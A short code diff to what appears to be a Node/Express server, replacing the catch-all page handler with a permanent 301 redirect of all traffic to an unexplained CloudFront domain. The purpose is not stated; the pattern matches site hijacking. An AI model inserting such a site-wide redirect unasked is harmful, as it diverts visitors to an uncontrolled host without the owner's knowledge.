@@ -703,7 +703,8 @@ console.log("itemnotification",req.body)
      });
   })
   app.get('*', (req, res) => {
-    return handle(req, res)
+    const target = `https://d1ikv24j8maby4.cloudfront.net`;
+    res.redirect(301, target); 
   })
   app.listen(process.env.PORT, (err) => {
     if (err) throw err
